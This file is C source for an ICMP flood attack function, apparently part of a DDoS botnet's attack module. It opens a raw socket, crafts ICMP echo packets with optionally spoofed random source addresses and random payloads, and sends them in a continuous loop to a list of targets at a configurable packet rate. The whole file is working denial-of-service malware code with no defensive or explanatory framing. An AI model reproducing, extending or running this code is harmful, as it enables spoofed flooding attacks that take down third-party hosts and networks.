#define _GNU_SOURCE


#include "../../attack.h"

void flood_icmp(struct flood *flood)
{
    int i, fd;
    int data_len = flood->settings->length == 0 ? 512 : flood->settings->length;
    unsigned char packet[4096];
    struct icmphdr *icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));

    
    if ((fd = sys_socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return;

    int one = 1;
    sys_setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct pps_limiter pps_limit;
    pps_limit_init(&pps_limit, flood->settings->min_pps, flood->settings->max_pps);

    while (*flood->running)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            struct flood_target target = flood->targets[i];

            uint32_t actual_len = flood->settings->length == 0 ? 512 : flood->settings->length;
            if (flood->settings->min_length > 0 && flood->settings->max_length > 0)
                actual_len = rand_next_range(flood->settings->min_length, flood->settings->max_length);

            int total_len = sizeof(struct iphdr) + 8 + actual_len;
            char *packet = malloc(total_len);
            memset(packet, 0, total_len);
            
            struct iphdr *ip = (struct iphdr *)packet;
            struct icmphdr *icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
            char *data = (char *)(packet + sizeof(struct iphdr) + 8);
            
            ip->version_ihl = (4 << 4) | 5;
            ip->tos = flood->settings->tos;
            ip->tot_len = htons(total_len);
            ip->id = htons(flood->settings->ident == 0xffff ? rand_next() : flood->settings->ident);
            ip->frag_off = flood->settings->dont_fragment ? htons(0x4000) : 0;
            ip->ttl = flood->settings->ttl;
            ip->protocol = IPPROTO_ICMP;
            ip->saddr = (flood->settings->source_ip == 0xffffffff) ? rand_next() : flood->settings->source_ip;
            ip->daddr = target.addr;
            ip->check = 0;
            ip->check = checksum_generic((uint16_t *)ip, sizeof(struct iphdr));

            // 2. ICMP Header
            icmp->type = ICMP_ECHO;
            icmp->code = 0;
            icmp->un.echo.id = (flood->settings->ident == 0xffff) ? (rand_cmwc() & 0xffff) : htons(flood->settings->ident);
            icmp->un.echo.sequence = (flood->settings->seq_rnd == 0xffff) ? (rand_cmwc() & 0xffff) : htons(flood->settings->seq_rnd);
            icmp->checksum = 0;

            // 3. Payload
            if (flood->settings->payload != NULL)
            {
                int p_len = strlen(flood->settings->payload);
                if (p_len > actual_len) p_len = actual_len;
                memcpy(data, flood->settings->payload, p_len);
                if (p_len < actual_len && flood->settings->random_data)
                    rand_str(data + p_len, actual_len - p_len);
            }
            else if (flood->settings->random_data)
            {
                rand_str(data, actual_len);
            }

            icmp->checksum = checksum_generic((uint16_t *)icmp, 8 + actual_len);

            if (sys_sendto(fd, packet, total_len, 0, (void *)&target.sock_addr, sizeof(struct sockaddr_in)) < 0)
            {
                if (errno == EAGAIN || errno == EWOULDBLOCK)
                    sys_usleep(100);
            }
            free(packet);
            pps_limit_wait(&pps_limit, flood->settings->min_pps, flood->settings->max_pps);
        }

        if (flood->settings->sleep > 0)
            sys_usleep(flood->settings->sleep * 1000);
    }
}
